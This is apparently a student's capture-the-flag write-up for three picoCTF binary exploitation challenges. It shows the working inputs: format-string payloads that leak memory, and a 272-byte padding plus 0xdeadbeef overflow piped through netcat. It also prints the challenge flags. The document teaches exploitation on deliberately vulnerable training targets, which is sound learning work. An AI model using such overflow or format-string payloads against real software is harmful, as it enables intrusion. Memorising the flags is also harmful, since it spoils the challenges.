# BINARY EXPLOITATION 

# 1. Buffer Overflow 0 
Description
Let's start off simple, can you overflow the correct buffer?

## Solution:
1. The challenge has given a source code (a C program). So, I analyzed it first.
2. Like most of the ctfs, this challenge has also given us the hint in the heading, ie BUFFER OVERFLOW.
3. On analyzing the code, I came across these key points.
a) While spotting the buffers in the code, we come across buf2[16], which tells us that the buffer can't take characters more than 16, which resonates with the challenge, ie exceeding it, causes an oevrflow.
b) This overflow usually outputs a segmentation error. But here, the SIGSEGV is modified like;
```
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```
c) And this modified handler prints the flag as an output for the error.

4. Connecting to the server using netcat : nc saturn.picoctf.net 58719 , I input a string with more than 16 characters and this revealed the flag.
<img width="782" height="108" alt="photo1 1" src="https://github.com/user-attachments/assets/476f68b2-7c0f-4408-9fd5-0f4cbf5c767f" />



## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts Learned:
1. I learned how a error message of a code can be manipulated the way we want it, by implementing a external handler.

## Notes:
1. Usually in these buffer overflow questions, we need to control the return address. For similar challenges, keep this in mind.

## Resources:
-https://www.geeksforgeeks.org/cpp/buffer-overflow-attack-with-example/ - Used this to understand the concept of buffer overflow.

***

# 2. Format String 0
> Description 
Can you use your knowledge of format strings to make the customers happy? 

## Solution:
1. First of all, I analyse the code given in the challenge. 
2. From the challenge's hint : This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before. and the code, I was able to find a lot of format specifiers involved. 
3. Also from the code, I found printf(choice1) and printf(choice2), which are not in their usual syntax form, allowing user to read the memory by passing format specifiers along with the input.
3. Having this knowledge, I connect to the server using netcat : nc mimas.picoctf.net 57117 . 
a) First part : I passed Gr%114d_Cheese, which resembled format specifiers bcz it had % symbol.
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
```
b) Second part : I passed Cla%sic_Che%s%steak bcz it had the format specifier %s, which is used for strings and our flag's format is in the string format. This revealed the flag for the challenge.
```
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts Learned:
- Normally you should write, eg: printf("%s", choice).
- But here, printf(choice1) and printf(choice2) are called without a format string. So, A direct user input as a format string allows you to use %s,etc to read the memory.

## Notes:
1. If you have a prior knowledge about format specifiers, you could just solve the above challenge without even analysing the code and stuff.

## Resources:
- https://cplusplus.com/reference/cstdio/printf/ - To refer the format specifiers 

***

# 3. clutter-overflow
> DESCRIPTION:
Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
1. We are given a c code in this challenge and a netcat link.
2. I access the netcat link in my terminal and gave a random input to try and see what this was actually trying to execute.
3. This is what was given as the output for a random input, as shown below
<img width="1085" height="568" alt="3 1" src="https://github.com/user-attachments/assets/e6046ae5-ce51-41bd-b01b-9cfc4b9f0928" />

4. Now, I analysed the c code that they gave in the challenge. On giving a glance through, I somewhat felt it to be some buffer overflow.

5. These are my analysis of the code:
a) The gets() function doesn’t stop reading input — so if I input more than 256 bytes, I can overwrite the nearby variable code.
b) By carefully crafting the input, you can change the memory value of code to 0xdeadbeef.
c) AND when that happens, the program prints the FLAG.

6. Now, I run gdb on the chall file they gave in the challenge.

7. Then, I run pattern_create 420, to generate a unique cyclic pattern to find buffer overflow offsets.
8. Then, I put its output as the input by running the program again.
9. On the RBP section, we are able to find the offset pattern that we need to execute. So, on executing the `pattern_offset %IA%eA%4`, we get the output as : 
```
%IA%eA%4 found at offset: 272
```
10. Now, I ran python and with the pwn tools, I printout the 32-bit value of 0xdeadbeef . AND then run `'A'*272`. 
```
>>> from pwn import *
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> 'A'*272
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>>
```
11. Now I run the program again and pipe the input into the chall file, ie : echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./chall . But the code part came like : 0x4141414141414141. This shows that we went more than we needed to and we need to take off some A's from the input. I took off 4 A's each time and gave the input, until code == 0xdeadbeef.
```
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{flag}
```

12. Thus, on executing : echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | nc mars.picoctf.net 31890 , the output revealed the flag.
```
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts Learnt:
- pattern_create generates a unique cyclic pattern (like Aa0Aa1Aa2…) used to find buffer overflow offsets.
- Followed by pattern_create, we use pattern_offset to find where the crash occurred.

## Resources:
- https://www.archcloudlabs.com/projects/pwntools-bof - to refer the concepts of pwntools 


***


